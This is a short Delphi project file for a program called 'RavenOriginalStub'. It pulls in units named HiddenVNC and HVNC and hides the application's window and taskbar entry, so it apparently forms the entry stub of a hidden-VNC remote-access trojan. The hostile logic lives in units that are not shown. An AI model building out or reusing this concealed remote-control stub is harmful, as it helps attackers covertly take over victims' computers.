program RavenOriginalStub;

uses
  Vcl.Forms,
  RavenMain in '..\..\..\Documents\Embarcadero\Studio\Projects\RavenMain.pas' {Form4},
  HiddenVNC in '..\..\..\Documents\all projects\all projects\Embarcadero\Studio\Projects\HiddenVNC.pas',
  HVNC in 'HVNC.pas';

{$R *.res}

begin
  Application.Initialize;
 Application.MainFormOnTaskbar := False;
  Application.ShowMainForm := False;
  Application.CreateForm(TForm4, Form4);
  Application.Run;
end.
